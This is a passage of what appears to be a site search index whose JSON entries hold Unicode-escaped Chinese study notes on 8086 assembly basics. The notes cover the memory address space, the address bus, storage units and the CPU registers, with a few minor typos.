\u8fd9\u4e9b\u6570\u636e\u4f1a\u88ab\u663e\u793a\u5361\u8f93\u51fa\u5230\u663e\u793a\u5668\u4e0a\uff1b\u6211\u4eec\u5411\u5730\u5740C0000\u301cFFFFF\u7684\u5185\u5b58\u5355\u5143\u4e2d\u5199\u5165\u6570\u636e \u7684\u64cd\u4f5c\u662f\u65e0\u6548\u7684\uff0c\u56e0\u4e3a\u8fd9\u7b49\u4e8e\u6539\u5199\u53ea\u8bfb\u5b58\u50a8\u5668\u4e2d\u7684\u5185\u5bb9\u3002","title":"\u5185\u5b58\u5730\u5740\u7a7a\u95f4"},{"location":"system/%E6%B1%87%E7%BC%96/%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4/#_1","text":"\u4e0a\u8ff0\u7684\u90a3\u4e9b\u5b58\u50a8\u5668\uff0c\u5728\u7269\u7406\u4e0a\u662f\u72ec\u7acb\u7684\u5668\u4ef6\uff0c\u4f46\u662f\u5728\u4ee5\u4e0b\u4e24\u70b9\u4e0a\u76f8\u540c\u3002 \u2022 \u90fd\u548cCPU\u7684\u603b\u7ebf\u76f8\u8fde\u3002 \u2022 CPU\u5bf9\u5b83\u4eec\u8fdb\u884c\u8bfb\u6216\u5199\u7684\u65f6\u5019\u90fd\u901a\u8fc7\u63a7\u5236\u7ebf\u53d1\u51fa\u5185\u5b58\u8bfb\u5199\u547d\u4ee4\u3002 \u8fd9\u4e5f\u5c31\u662f\u8bf4\uff0cCPU\u5728\u64cd\u63a7\u5b83\u4eec\u7684\u65f6\u5019\uff0c\u628a\u5b83\u4eec\u90fd\u5f53\u4f5c\u5185\u5b58\u6765\u5bf9\u5f85\uff0c\u628a\u5b83\u4eec\u603b\u7684\u770b\u4f5c\u4e00\u4e2a\u7531\u82e5\u5e72\u5b58\u50a8\u5355\u5143\u7ec4\u6210\u7684\u903b\u8f91\u5b58\u50a8\u5668\uff0c\u8fd9\u4e2a\u903b\u8f91\u5b58\u50a8\u5668\u5c31\u662f\u6211\u4eec\u6240\u8bf4\u7684\u5185\u5b58\u5730\u5740\u7a7a\u95f4\u3002 \u5728\u6c47\u7f16\u8fd9\u95e8\u8bfe\u4e2d\uff0c\u6211\u4eec\u6240\u9762\u5bf9\u7684\u662f\u5185\u5b58\u5730\u5740\u7a7a\u95f4 \u6240\u6709\u7684\u7269\u7406\u5b58\u50a8\u5668\u88ab\u770b\u4f5c\u4e00\u4e2a\u7531\u82e5\u5e72\u5b58\u50a8\u5355\u5143\u7ec4\u6210\u7684\u903b\u8f91\u5b58\u50a8\u5668\uff0c\u6bcf\u4e2a \u7269\u7406\u5b58\u50a8\u5668\u5728\u8fd9\u4e2a\u903b\u8f91\u5b58\u50a8\u5668\u4e2d\u5360\u6709\u4e00\u4e2a\u5730\u5740\u6bb5\uff0c\u5373\u4e00\u6bb5\u5730\u5740\u7a7a\u95f4\u3002CPU\u5728\u8fd9\u6bb5\u5730\u5740\u7a7a \u95f4\u4e2d\u8bfb\u5199\u6570\u636e\uff0c\u5b9e\u9645\u4e0a\u5c31\u662f\u5728\u76f8\u5bf9\u5e94\u7684\u7269\u7406\u5b58\u50a8\u5668\u4e2d\u8bfb\u5199\u6570\u636e \u5185\u5b58\u5730\u5740\u7a7a\u95f4\u7684\u5927\u5c0f\u53d7CPU\u5730\u5740\u603b\u7ebf\u5bbd\u5ea6\u7684\u9650\u5236\u30028086CPU\u7684\u5730\u5740\u603b\u7ebf\u5bbd\u5ea6\u4e3a20, \u53ef\u4ee5\u4f20\u90012\u768420\u6b21\u65b9\u4e2a\u4e0d\u540c\u7684\u5730\u5740\u4fe1\u606f\uff08\u5927\u5c0f\u4ece0\u81f32\u768420\u6b21\u65b9-1\uff09\u5373\u53ef\u4ee5\u5b9a\u4f4d2\u768422\u6b21\u65b9\u4e2a\u5185\u5b58\u5355\u5143\uff0c\u5219 8086CPC\u7684\u5185\u5b58\u5730\u5740\u7a7a\u95f4\u5927\u5c0f\u4e3a1MB\u3002\u540c\u7406\uff0c80386CPU\u7684\u5730\u5740\u603b\u7ebf\u5bbd\u5ea6\u4e3a32,\u5219\u5185\u5b58\u5730 \u5740\u7a7a\u95f4\u6700\u5927\u4e3a4GB \u6211\u4eec\u5728\u57fa\u4e8e\u4e00\u4e2a\u8ba1\u7b97\u673a\u786c\u4ef6\u7cfb\u7edf\u7f16\u7a0b\u7684\u65f6\u5019\uff0c\u5fc5\u987b\u77e5\u9053\u8fd9\u4e2a\u7cfb\u7edf\u4e2d\u7684\u5185\u5b58\u5730\u5740\u7a7a\u95f4\u5206\u914d\u60c5\u51b5\u3002\u56e0\u4e3a\u5f53\u6211\u4eec\u60f3\u5728\u67d0\u7c7b\u5b58\u50a8\u5668\u4e2d\u8bfb\u5199\u6570\u636e\u7684\u65f6\u5019\uff0c\u5fc5\u987b\u77e5\u9053\u5b83\u7684\u7b2c\u4e00\u4e2a\u5355\u5143\u7684\u5730\u5740 \u548c\u6700\u540e\u4e00\u4e2a\u5355\u5143\u7684\u5730\u5740\uff0c\u624d\u80fd\u4fdd\u8bc1\u8bfb\u5199\u64cd\u4f5c\u662f\u5728\u9884\u671f\u7684\u5b58\u50a8\u5668\u4e2d\u8fdb\u884c\u3002\u6bd4\u5982\uff0c\u6211\u4eec\u5e0c\u671b\u5411 \u663e\u793a\u5668\u8f93\u51fa\u4e00\u6bb5\u4fe1\u606f\uff0c\u90a3\u4e48\u5fc5\u987b\u5c06\u8fd9\u6bb5\u4fe1\u606f\u5199\u5230\u663e\u5b58\u4e2d\uff0c\u663e\u5361\u624d\u80fd\u5c06\u5b83\u8f93\u5c80\u5230\u663e\u793a\u5668\u4e0a\u3002 \u8981\u5411\u663e\u5b58\u4e2d\u5199\u5165\u6570\u636e\uff0c\u5fc5\u987b\u77e5\u9053\u663e\u5b58\u5728\u5185\u5b58\u5730\u5740\u7a7a\u95f4\u4e2d\u7684\u5730\u5740 \u4e0d\u540c\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u5185\u5b58\u5730\u5740\u7a7a\u95f4\u7684\u5206\u914d\u60c5\u51b5\u662f\u4e0d\u540c\u7684\uff0c\u56fe1.9\u5c55\u793a\u4e86 8086PC\u673a\u5185 \u5b58\u5730\u5740\u7a7a\u95f4\u5206\u914d\u7684\u57fa\u672c\u60c5\u51b5\u3002 \u56fe1.9\u544a\u8bc9\u6211\u4eec\uff0c\u4ece\u5730\u57400-9FFFF\u7684\u5185\u5b58\u5355\u5143\u4e2d\u8bfb\u53d6\u6570\u636e\uff0c\u5b9e\u9645\u4e0a\u5c31\u662f\u5728\u8bfb\u53d6\u4e3b\u968f\u673a \u5b58\u50a8\u5668\u4e2d\u7684\u6570\u636e\uff1b\u5411\u5730\u5740A0000-BFFFF\u7684\u5185\u5b58\u5355\u5143\u4e2d\u5199\u6570\u636e\uff0c\u5c31\u662f\u5411\u663e\u5b58\u4e2d\u5199\u5165\u6570\u636e\uff0c \u8fd9\u4e9b\u6570\u636e\u4f1a\u88ab\u663e\u793a\u5361\u8f93\u51fa\u5230\u663e\u793a\u5668\u4e0a\uff1b\u6211\u4eec\u5411\u5730\u5740C0000\u301cFFFFF\u7684\u5185\u5b58\u5355\u5143\u4e2d\u5199\u5165\u6570\u636e \u7684\u64cd\u4f5c\u662f\u65e0\u6548\u7684\uff0c\u56e0\u4e3a\u8fd9\u7b49\u4e8e\u6539\u5199\u53ea\u8bfb\u5b58\u50a8\u5668\u4e2d\u7684\u5185\u5bb9\u3002","title":"\u5185\u5b58\u5730\u5740\u7a7a\u95f4"},{"location":"system/%E6%B1%87%E7%BC%96/%E5%9C%B0%E5%9D%80%E6%80%BB%E7%BA%BF/","text":"\u5730\u5740\u603b\u7ebf CPU\u662f\u901a\u8fc7\u5730\u5740\u603b\u7ebf\u6765\u6307\u5b9a\u5b58\u50a8\u5668\u5355\u5143\u7684\u3002\u53ef\u89c1\u5730\u5740\u603b\u7ebf\u4e0a\u80fd\u4f20\u9001\u591a\u5c11\u4e2a\u4e0d\u540c\u7684\u4fe1\u606f\uff0cCPU\u5c31\u53ef\u4ee5\u5bf9\u591a\u5c11\u4e2a\u5b58\u50a8\u5355\u5143\u8fdb\u884c\u5bfb\u5740\u3002 \u73b0\u5047\u8bbe\uff0c\u4e00\u4e2aCPU\u670910\u6839\u5730\u5740\u603b\u7ebf\uff0c\u5728 \u7535\u5b50\u8ba1\u7b97\u673a\u4e2d\uff0c\u4e00\u6839\u5bfc\u7ebf\u53ef\u4ee5\u4f20\u9001\u7684\u7a33\u5b9a\u72b6\u6001\u53ea\u6709\u4e24\u79cd\uff0c\u9ad8\u7535\u5e73\u6216\u662f\u4f4e\u7535\u5e73\u3002\u7528\u4e8c\u8fdb\u5236\u8868 \u793a\u5c31\u662f1\u62160, 10\u6839\u5bfc\u7ebf\u53ef\u4ee5\u4f20\u900110\u4f4d\u4e8c\u8fdb\u5236\u6570\u636e\u3002\u800c10\u4f4d\u4e8c\u8fdb\u5236\u6570\u53ef\u4ee5\u8868\u793a\u591a\u5c11\u4e2a\u4e0d \u540c\u7684\u6570\u636e\u5462\uff1f 2\u768410\u6b21\u65b9\u4e2a\u3002\u6700\u5c0f\u6570\u4e3a0,\u6700\u5927\u6570\u4e3a1023\u3002 \u4e00\u4e2aCPU\u6709N\u6839\u5730\u5740\u7ebf\uff0c\u5219\u53ef\u4ee5\u8bf4\u8fd9\u4e2aCPU\u7684\u5730\u5740\u603b\u7ebf\u7684\u5bbd\u5ea6\u4e3aN\u3002\u8fd9\u6837\u7684CPU\u6700\u591a\u53ef\u4ee5\u5bfb\u627e2\u7684N\u6b21\u65b9\u4e2a\u5185\u5b58\u5355\u5143\u3002","title":"\u5730\u5740\u603b\u7ebf"},{"location":"system/%E6%B1%87%E7%BC%96/%E5%9C%B0%E5%9D%80%E6%80%BB%E7%BA%BF/#_1","text":"CPU\u662f\u901a\u8fc7\u5730\u5740\u603b\u7ebf\u6765\u6307\u5b9a\u5b58\u50a8\u5668\u5355\u5143\u7684\u3002\u53ef\u89c1\u5730\u5740\u603b\u7ebf\u4e0a\u80fd\u4f20\u9001\u591a\u5c11\u4e2a\u4e0d\u540c\u7684\u4fe1\u606f\uff0cCPU\u5c31\u53ef\u4ee5\u5bf9\u591a\u5c11\u4e2a\u5b58\u50a8\u5355\u5143\u8fdb\u884c\u5bfb\u5740\u3002 \u73b0\u5047\u8bbe\uff0c\u4e00\u4e2aCPU\u670910\u6839\u5730\u5740\u603b\u7ebf\uff0c\u5728 \u7535\u5b50\u8ba1\u7b97\u673a\u4e2d\uff0c\u4e00\u6839\u5bfc\u7ebf\u53ef\u4ee5\u4f20\u9001\u7684\u7a33\u5b9a\u72b6\u6001\u53ea\u6709\u4e24\u79cd\uff0c\u9ad8\u7535\u5e73\u6216\u662f\u4f4e\u7535\u5e73\u3002\u7528\u4e8c\u8fdb\u5236\u8868 \u793a\u5c31\u662f1\u62160, 10\u6839\u5bfc\u7ebf\u53ef\u4ee5\u4f20\u900110\u4f4d\u4e8c\u8fdb\u5236\u6570\u636e\u3002\u800c10\u4f4d\u4e8c\u8fdb\u5236\u6570\u53ef\u4ee5\u8868\u793a\u591a\u5c11\u4e2a\u4e0d \u540c\u7684\u6570\u636e\u5462\uff1f 2\u768410\u6b21\u65b9\u4e2a\u3002\u6700\u5c0f\u6570\u4e3a0,\u6700\u5927\u6570\u4e3a1023\u3002 \u4e00\u4e2aCPU\u6709N\u6839\u5730\u5740\u7ebf\uff0c\u5219\u53ef\u4ee5\u8bf4\u8fd9\u4e2aCPU\u7684\u5730\u5740\u603b\u7ebf\u7684\u5bbd\u5ea6\u4e3aN\u3002\u8fd9\u6837\u7684CPU\u6700\u591a\u53ef\u4ee5\u5bfb\u627e2\u7684N\u6b21\u65b9\u4e2a\u5185\u5b58\u5355\u5143\u3002","title":"\u5730\u5740\u603b\u7ebf"},{"location":"system/%E6%B1%87%E7%BC%96/%E5%AD%98%E5%82%A8%E5%8D%95%E5%85%83/","text":"\u5b58\u50a8\u5355\u5143 \u5b58\u50a8\u5668\u88ab\u5212\u5206\u6210\u82e5\u5e72\u4e2a\u5b58\u50a8\u5355\u5143\uff0c\u6bcf\u4e2a\u5b58\u50a8\u5355\u5143\u4ece0\u5f00 \u59cb\u987a\u5e8f\u7f16\u53f7\uff0c\u4f8b\u5982\u4e00\u4e2a\u5b58\u50a8\u5668\u6709128\u4e2a\u5b58\u50a8\u5355\u5143\uff0c\u7f16\u53f7\u4ece 0\u301c127\uff0c\u4e00\u4e2a\u5b58\u50a8\u5355\u5143\u5b58\u50a8\u4e00\u4e2aByte\uff08\u5b57\u8282\uff09\u3002 \u4e00\u4e2aByte\u75318\u4e2abit\u7ec4\u6210\uff0c\u4e00\u4e2abit\u8868\u793a\u4e00\u4e2a0\u6216\u80051\u3002\u5fae\u673a\u5b58\u50a8\u5668\u7684\u5bb9\u91cf\u662f\u4ee5Byte\uff08\u5b57\u8282\uff09\u4e3a\u6700\u5c0f\u5355\u4f4d\u6765\u8ba1\u7b97\u7684\u3002 1KB = 1024B 1 MB = 1024KB 1GB = 1024MB 1TB = 1024GB \u4e0b\u9762\u8868\u683c\uff0c\u4e00\u884c\u8868\u793a\u4e00\u4e2a\u5b58\u50a8\u5355\u5143\uff08Byte\uff09\uff0c\u75318\u4e2abit\u7ec4\u6210\u3002\u6bcf\u884c\u90fd\u6709\u4e00\u4e2a\u5730\u5740 0 0 0 0 1 1 1 1 CPU\u8981\u60f3\u8fdb\u884c\u6570\u636e\u7684\u8bfb\u5199\uff0c\u5fc5\u987b\u548c\u5916\u90e8\u5668\u4ef6\uff08\u6807\u51c6\u7684\u8bf4\u6cd5\u662f\u82af\u7247\uff09\u8fdb\u884c\u4e0b\u97623\u7c7b \u4fe1\u606f\u7684\u4ea4\u4e92\u3002 \u2022 \u5b58\u50a8\u5355\u5143\u7684\u5730\u5740\uff08\u5730\u5740\u4fe1\u606f\uff09 \u2022 \u5668\u4ef6\u7684\u9009\u62e9\uff0c\u8bfb\u6216\u5199\u7684\u547d\u4ee4\uff08\u63a7\u5236\u4fe1\u606f\uff09 \u2022 \u8bfb\u6216\u5199\u7684\u6570\u636e\uff08\u6570\u636e\u4fe1\u606f\uff09 \u5728\u8ba1\u7b97\u673a\u4e2d\u4e13\u95e8\u6709\u8fde\u63a5 CPU\u548c\u5176\u4ed6\u82af\u7247\u7684\u5bfc\u7ebf\uff0c\u901a\u5e38\u79f0\u4e3a\u603b\u7ebf\u3002\u603b\u7ebf\u4ece\u7269\u7406\u4e0a\u6765\u8bb2\uff0c\u5c31\u662f\u4e00\u6839\u6839\u5bfc\u7ebf\u7684\u96c6\u5408\u3002 \u6839\u636e\u4f20\u9001\u4fe1\u606f\u7684\u4e0d\u540c\uff0c\u603b\u7ebf\u4ece\u903b\u8f91\u4e0a\u53c8\u5206\u4e3a3\u7c7b\uff0c\u5730\u5740\u603b\u7ebf\u3001\u63a7\u5236\u603b\u7ebf\u548c\u6570\u636e\u603b\u7ebf CPU\u901a\u8fc7\u5730\u5740\u7ebf\u5c06\u5730\u5740\u4fe1\u606f3\u53d1\u51fa\u3002 CPU\u901a\u8fc7\u63a7\u5236\u7ebf\u53d1\u51fa\u5185\u5b58\u8bfb\u547d\u4ee4\uff0c\u9009\u4e2d\u5b58\u50a8\u5668\u82af\u7247\uff0c\u5e76\u901a\u77e5\u5b83\uff0c\u5c06\u8981\u4ece\u4e2d\u8bfb\u53d6\u6570\u636e\u3002 \u5b58\u50a8\u5668\u5c063\u53f7\u5355\u5143\u4e2d\u7684\u6570\u636e8\u901a\u8fc7\u6570\u636e\u7ebf\u9001\u5165CPU","title":"\u5b58\u50a8\u5355\u5143"},{"location":"system/%E6%B1%87%E7%BC%96/%E5%AD%98%E5%82%A8%E5%8D%95%E5%85%83/#_1","text":"\u5b58\u50a8\u5668\u88ab\u5212\u5206\u6210\u82e5\u5e72\u4e2a\u5b58\u50a8\u5355\u5143\uff0c\u6bcf\u4e2a\u5b58\u50a8\u5355\u5143\u4ece0\u5f00 \u59cb\u987a\u5e8f\u7f16\u53f7\uff0c\u4f8b\u5982\u4e00\u4e2a\u5b58\u50a8\u5668\u6709128\u4e2a\u5b58\u50a8\u5355\u5143\uff0c\u7f16\u53f7\u4ece 0\u301c127\uff0c\u4e00\u4e2a\u5b58\u50a8\u5355\u5143\u5b58\u50a8\u4e00\u4e2aByte\uff08\u5b57\u8282\uff09\u3002 \u4e00\u4e2aByte\u75318\u4e2abit\u7ec4\u6210\uff0c\u4e00\u4e2abit\u8868\u793a\u4e00\u4e2a0\u6216\u80051\u3002\u5fae\u673a\u5b58\u50a8\u5668\u7684\u5bb9\u91cf\u662f\u4ee5Byte\uff08\u5b57\u8282\uff09\u4e3a\u6700\u5c0f\u5355\u4f4d\u6765\u8ba1\u7b97\u7684\u3002 1KB = 1024B 1 MB = 1024KB 1GB = 1024MB 1TB = 1024GB \u4e0b\u9762\u8868\u683c\uff0c\u4e00\u884c\u8868\u793a\u4e00\u4e2a\u5b58\u50a8\u5355\u5143\uff08Byte\uff09\uff0c\u75318\u4e2abit\u7ec4\u6210\u3002\u6bcf\u884c\u90fd\u6709\u4e00\u4e2a\u5730\u5740 0 0 0 0 1 1 1 1 CPU\u8981\u60f3\u8fdb\u884c\u6570\u636e\u7684\u8bfb\u5199\uff0c\u5fc5\u987b\u548c\u5916\u90e8\u5668\u4ef6\uff08\u6807\u51c6\u7684\u8bf4\u6cd5\u662f\u82af\u7247\uff09\u8fdb\u884c\u4e0b\u97623\u7c7b \u4fe1\u606f\u7684\u4ea4\u4e92\u3002 \u2022 \u5b58\u50a8\u5355\u5143\u7684\u5730\u5740\uff08\u5730\u5740\u4fe1\u606f\uff09 \u2022 \u5668\u4ef6\u7684\u9009\u62e9\uff0c\u8bfb\u6216\u5199\u7684\u547d\u4ee4\uff08\u63a7\u5236\u4fe1\u606f\uff09 \u2022 \u8bfb\u6216\u5199\u7684\u6570\u636e\uff08\u6570\u636e\u4fe1\u606f\uff09 \u5728\u8ba1\u7b97\u673a\u4e2d\u4e13\u95e8\u6709\u8fde\u63a5 CPU\u548c\u5176\u4ed6\u82af\u7247\u7684\u5bfc\u7ebf\uff0c\u901a\u5e38\u79f0\u4e3a\u603b\u7ebf\u3002\u603b\u7ebf\u4ece\u7269\u7406\u4e0a\u6765\u8bb2\uff0c\u5c31\u662f\u4e00\u6839\u6839\u5bfc\u7ebf\u7684\u96c6\u5408\u3002 \u6839\u636e\u4f20\u9001\u4fe1\u606f\u7684\u4e0d\u540c\uff0c\u603b\u7ebf\u4ece\u903b\u8f91\u4e0a\u53c8\u5206\u4e3a3\u7c7b\uff0c\u5730\u5740\u603b\u7ebf\u3001\u63a7\u5236\u603b\u7ebf\u548c\u6570\u636e\u603b\u7ebf CPU\u901a\u8fc7\u5730\u5740\u7ebf\u5c06\u5730\u5740\u4fe1\u606f3\u53d1\u51fa\u3002 CPU\u901a\u8fc7\u63a7\u5236\u7ebf\u53d1\u51fa\u5185\u5b58\u8bfb\u547d\u4ee4\uff0c\u9009\u4e2d\u5b58\u50a8\u5668\u82af\u7247\uff0c\u5e76\u901a\u77e5\u5b83\uff0c\u5c06\u8981\u4ece\u4e2d\u8bfb\u53d6\u6570\u636e\u3002 \u5b58\u50a8\u5668\u5c063\u53f7\u5355\u5143\u4e2d\u7684\u6570\u636e8\u901a\u8fc7\u6570\u636e\u7ebf\u9001\u5165CPU","title":"\u5b58\u50a8\u5355\u5143"},{"location":"system/%E6%B1%87%E7%BC%96/%E5%AF%84%E5%AD%98%E5%99%A8/","text":"\u5bc4\u5b58\u5668 \u5728CPU\u4e2d\uff1a \u2022 \u8fd0\u7b97\u5668\u8fdb\u884c\u4fe1\u606f\u5904\u7406\uff1b \u2022 \u5bc4\u5b58\u5668\u8fdb\u884c\u4fe1\u606f\u5b58\u50a8\uff1b \u2022 \u63a7\u5236\u5668\u63a7\u5236\u5404\u79cd\u5668\u4ef6\u8fdb\u884c\u5de5\u4f5c\uff1b \u2022 \u5185\u90e8\u603b\u7ebf\u8fde\u63a5\u5404\u79cd\u5668\u4ef6\uff0c\u5728\u5b83\u4eec\u4e4b\u95f4\u8fdb\u884c\u6570\u636e\u7684\u4f20\u9001 \u5bf9\u4e8e\u4e00\u4e2a\u6c47\u7f16\u7a0b\u5e8f\u5458\u6765\u8bf4\uff0cCPU\u4e2d\u7684\u4e3b\u8981\u90e8\u4ef6\u662f\u5bc4\u5b58\u5668\u3002\u5bc4\u5b58\u5668\u662fCPU\u4e2d\u7a0b\u5e8f\u5458\u53ef\u4ee5\u7528\u6307\u4ee4\u8bfb\u5199\u7684\u90e8\u4ef6\u3002\u7a0b\u5e8f\u5458\u901a\u8fc7\u6539\u53d8\u5404\u79cd\u5bc4\u5b58\u5668\u4e2d\u7684\u5185\u5bb9\u6765\u5b9e\u73b0\u5bf9CPU\u7684\u63a7\u5236\u3002 \u901a\u7528\u5bc4\u5b58\u5668 8086CPU\u7684\u6240\u6709\u5bc4\u5b58\u5668\u90fd\u662f16\u4f4d\u7684\uff0c\u53ef\u4ee5\u5b58\u653e\u4e24\u4e2a\u5b57\u8282\u3002AX\u3001BX\u3001CX\u3001DX\u8fd94\u4e2a\u5bc4\u5b58\u5668\u901a\u5e38\u7528\u6765\u5b58\u653e\u4e00\u822c\u6027\u7684\u6570\u636e\uff0c\u88ab\u79f0\u4e3a\u901a\u7528\u5bc4\u5b58\u5668\u3002 8086CPU\u7684\u4e0a\u4e00\u4ee3CPU\u4e2d\u7684\u5bc4\u5b58\u5668\u90fd\u662f8\u4f4d\u7684\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u517c\u5bb9\uff0c\u4f7f\u539f\u6765\u57fa\u4e8e\u4e0a\u4ee3CPU\u7f16\u5199\u7684\u7a0b\u5e8f\u7a0d\u52a0\u4fee\u6539\u5c31\u53ef\u4ee5\u8fd0\u884c\u57288086\u4e4b\u4e0a\uff0c8086CPU\u7684AX\u3001BX\u3001CX\u3001DX\u8fd94 \u4e2a\u5bc4\u5b58\u5668\u90fd\u53ef\u5206\u4e3a\u4e24\u4e2a\u53ef\u72ec\u7acb\u4f7f\u7528\u76848\u4f4d\u5bc4\u5b58\u5668\u6765\u7528\uff1a AX\u53ef\u5206\u4e3aAH\u548cAL\uff1b BX\u53ef\u5206\u4e3aBH\u548cBL\uff1b CX\u53ef\u5206\u4e3aCH\u548cCL\uff1b DX\u53ef\u5206\u4e3aDH\u548cDL\uff1b \u5728\u7ebf10\u8fdb\u5236\u8f6c\u63622\u8fdb\u5236\u8ba1\u7b97\u5668\uff1a \u5728\u7ebf\u8fdb\u5236\u8f6c\u6362\u5668 | \u83dc\u9e1f\u5de5\u5177 (runoob.com) \u6bb5\u5bc4\u5b58\u5668 8086CPU\u5728\u8bbf\u95ee\u7269\u7406\u5730\u5740\u7684\u65f6\u5019\uff0c\u7269\u7406\u5730\u5740= \u6bb5\u5730\u5740X16+\u504f\u79fb\u5730\u5740 \u3002\u6bb5\u5730\u5740\u57288086CPU\u7684\u6bb5\u5bc4\u5b58\u5668\u4e2d\u5b58\u653e\u3002 8086CPU\u67094\u4e2a\u6bb5\u5bc4\u5b58\u5668\uff1aCS\u3001DS\u3001SS\u3001ES\u3002\u5f538086CPU\u8981\u8bbf\u95ee\u5185\u5b58\u65f6\u7531\u8fd94\u4e2a\u6bb5\u5bc4\u5b58\u5668\u63d0\u4f9b\u5185\u5b58\u5355\u5143\u7684\u6bb5\u5730\u5740 \u4ee3\u7801\u6bb5\u5bc4\u5b58\u5668 CS\u4e3a\u4ee3\u7801\u6bb5\u5bc4\u5b58\u5668 \u6307\u4ee4\u6307\u9488\u5bc4\u5b58\u5668 IP\u4e3a\u6307\u4ee4\u6307\u9488\u5bc4\u5b58\u5668 \u57288086PC\u673a\u4e2d\uff0c\u4efb\u610f\u65f6\u523b\uff0c\u8bbeCS\u4e2d\u7684\u5185\u5bb9\u4e3aM, IP\u4e2d\u7684\u5185\u5bb9\u4e3aN, 8086CPU\u5c06\u4ece\u5185\u5b58 M \u00d7 16 + N \u5355\u5143\u5f00\u59cb\uff0c\u8bfb\u53d6\u4e00\u6761\u6307\u4ee4\u5e76\u6267\u884c\u3002 \u4e5f\u53ef\u4ee5\u8fd9\u6837\u8868\u8ff0\uff1a8086\u673a\u4e2d\uff0c\u4efb\u610f\u65f6\u523b\uff0cCPU\u5c06CS:IP\u6307\u5411\u7684\u5185\u5bb9\u5f53\u4f5c\u6307\u4ee4\u6267\u884c\u3002 (1) \u4eceCS:IP\u6307\u5411\u7684\u5185\u5b58\u5355\u5143\u8bfb\u53d6\u6307\u4ee4\uff0c\u8bfb\u53d6\u7684\u6307\u4ee4\u8fdb\u5165\u6307\u4ee4\u7f13\u51b2\u5668\uff1b (2) IP=IP+\u6240\u8bfb\u53d6\u6307\u4ee4\u7684\u957f\u5ea6\uff0c\u4ece\u800c\u6307\u5411\u4e0b\u4e00\u6761\u6307\u4ee4\uff1b (3) \u6267\u884c\u6307\u4ee4\u3002\u8f6c\u5230\u6b65\u9aa4(1),\u91cd\u590d\u8fd9\u4e2a\u8fc7\u7a0b\u3002 \u4fee\u6539IP\u5bc4\u5b58\u5668\u6307\u4ee4\uff1a \u300ejmp \u67d0\u4e00\u5408\u6cd5\u5bc4\u5b58\u5668\u300f\u6307\u4ee4\u7684\u529f\u80fd\u4e3a\uff1a\u7528\u5bc4\u5b58\u5668\u4e2d\u7684\u503c\u4fee\u6539IP jmp ax , \u5728\u542b\u4e49\u4e0a\u597d\u4f3c\uff1amov IP,ax","title":"\u5bc4\u5b58\u5668"},{"location":"system/%E6%B1%87%E7%BC%96/%E5%AF%84%E5%AD%98%E5%99%A8/#_1","text":"\u5728CPU\u4e2d\uff1a \u2022 \u8fd0\u7b97\u5668\u8fdb\u884c\u4fe1\u606f\u5904\u7406\uff1b \u2022 \u5bc4\u5b58\u5668\u8fdb\u884c\u4fe1\u606f\u5b58\u50a8\uff1b \u2022 \u63a7\u5236\u5668\u63a7\u5236\u5404\u79cd\u5668\u4ef6\u8fdb\u884c\u5de5\u4f5c\uff1b \u2022 \u5185\u90e8\u603b\u7ebf\u8fde\u63a5\u5404\u79cd\u5668\u4ef6\uff0c\u5728\u5b83\u4eec\u4e4b\u95f4\u8fdb\u884c\u6570\u636e\u7684\u4f20\u9001 \u5bf9\u4e8e\u4e00\u4e2a\u6c47\u7f16\u7a0b\u5e8f\u5458\u6765\u8bf4\uff0cCPU\u4e2d\u7684\u4e3b\u8981\u90e8\u4ef6\u662f\u5bc4\u5b58\u5668\u3002\u5bc4\u5b58\u5668\u662fCPU\u4e2d\u7a0b\u5e8f\u5458\u53ef\u4ee5\u7528\u6307\u4ee4\u8bfb\u5199\u7684\u90e8\u4ef6\u3002\u7a0b\u5e8f\u5458\u901a\u8fc7\u6539\u53d8\u5404\u79cd\u5bc4\u5b58\u5668\u4e2d\u7684\u5185\u5bb9\u6765\u5b9e\u73b0\u5bf9CPU\u7684\u63a7\u5236\u3002","title":"\u5bc4\u5b58\u5668"},{"location":"system/%E6%B1%87%E7%BC%96/%E5%AF%84%E5%AD%98%E5%99%A8/#_2","text":"8086CPU\u7684\u6240\u6709\u5bc4\u5b58\u5668\u90fd\u662f16\u4f4d\u7684\uff0c\u53ef\u4ee5\u5b58\u653e\u4e24\u4e2a\u5b57\u8282\u3002AX\u3001BX\u3001CX\u3001DX\u8fd94\u4e2a\u5bc4\u5b58\u5668\u901a\u5e38\u7528\u6765\u5b58\u653e\u4e00\u822c\u6027\u7684\u6570\u636e\uff0c\u88ab\u79f0\u4e3a\u901a\u7528\u5bc4\u5b58\u5668\u3002 8086CPU\u7684\u4e0a\u4e00\u4ee3CPU\u4e2d\u7684\u5bc4\u5b58\u5668\u90fd\u662f8\u4f4d\u7684\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u517c\u5bb9\uff0c\u4f7f\u539f\u6765\u57fa\u4e8e\u4e0a\u4ee3CPU\u7f16\u5199\u7684\u7a0b\u5e8f\u7a0d\u52a0\u4fee\u6539\u5c31\u53ef\u4ee5\u8fd0\u884c\u57288086\u4e4b\u4e0a\uff0c8086CPU\u7684AX\u3001BX\u3001CX\u3001DX\u8fd94 \u4e2a\u5bc4\u5b58\u5668\u90fd\u53ef\u5206\u4e3a\u4e24\u4e2a\u53ef\u72ec\u7acb\u4f7f\u7528\u76848\u4f4d\u5bc4\u5b58\u5668\u6765\u7528\uff1a AX\u53ef\u5206\u4e3aAH\u548cAL\uff1b BX\u53ef\u5206\u4e3aBH\u548cBL\uff1b CX\u53ef\u5206\u4e3aCH\u548cCL\uff1b DX\u53ef\u5206\u4e3aDH\u548cDL\uff1b \u5728\u7ebf10\u8fdb\u5236\u8f6c\u63622\u8fdb\u5236\u8ba1\u7b97\u5668\uff1a \u5728\u7ebf\u8fdb\u5236\u8f6c\u6362\u5668 | \u83dc\u9e1f\u5de5\u5177 (runoob.com)","title":"\u901a\u7528\u5bc4\u5b58\u5668"},{"location":"system/%E6%B1%87%E7%BC%96/%E5%AF%84%E5%AD%98%E5%99%A8/#_3","text":"8086CPU\u5728\u8bbf\u95ee\u7269\u7406\u5730\u5740\u7684\u65f6\u5019\uff0c\u7269\u7406\u5730\u5740= \u6bb5\u5730\u5740X16+\u504f\u79fb\u5730\u5740 \u3002\u6bb5\u5730\u5740\u57288086CPU\u7684\u6bb5\u5bc4\u5b58\u5668\u4e2d\u5b58\u653e\u3002 